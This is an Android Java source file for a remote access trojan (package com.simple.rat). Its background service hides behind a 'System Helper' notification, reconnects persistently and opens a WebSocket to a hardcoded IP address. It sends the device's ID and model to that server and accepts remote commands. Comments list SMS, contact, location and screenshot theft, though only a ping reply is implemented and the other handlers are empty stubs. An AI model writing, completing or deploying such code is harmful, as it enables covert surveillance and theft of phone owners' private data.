package com.simple.rat;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class MainService extends Service {
    private static final String TAG = "RAT_SERVICE";
    private static final String WS_URL = "ws://91.124.209.233:8080";
    private static final String CHANNEL_ID = "RAT_CHANNEL";
    private WebSocket webSocket;
    private OkHttpClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created");
        createNotificationChannel();
        startForeground(1, createNotification());
        connectWebSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started");
        return START_STICKY;
    }

    private void connectWebSocket() {
        client = new OkHttpClient();
        Request request = new Request.Builder()
            .url(WS_URL)
            .build();

        client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                MainService.this.webSocket = webSocket;
                Log.d(TAG, "WebSocket connected");
                sendDeviceInfo();
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d(TAG, "Received: " + text);
                handleCommand(text);
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "WebSocket closed: " + reason);
                reconnect();
            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "WebSocket error: " + t.getMessage());
                reconnect();
            }
        });

        client.dispatcher().executorService().shutdown();
    }

    private void sendDeviceInfo() {
        try {
            String info = "{\"type\":\"device_info\",\"device_id\":\"" + Build.ID + "\",\"model\":\"" + Build.MODEL + "\"}";
            if (webSocket != null) {
                webSocket.send(info);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending device info: " + e.getMessage());
        }
    }

    private void handleCommand(String command) {
        try {
            // Parse command
            // دستورات: ping, sms, contact, location, screenshot
            if (command.contains("ping")) {
                webSocket.send("{\"type\":\"pong\",\"timestamp\":\"" + System.currentTimeMillis() + "\"}");
            } else if (command.contains("sms")) {
                // دریافت SMS
            } else if (command.contains("contact")) {
                // دریافت مخاطبین
            } else if (command.contains("location")) {
                // دریافت موقعیت
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling command: " + e.getMessage());
        }
    }

    private void reconnect() {
        try {
            Thread.sleep(5000);
            connectWebSocket();
        } catch (InterruptedException e) {
            Log.e(TAG, "Reconnect interrupted");
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "RAT Service",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Helper")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webSocket != null) {
            webSocket.close(1000, "Service destroyed");
        }
    }
}
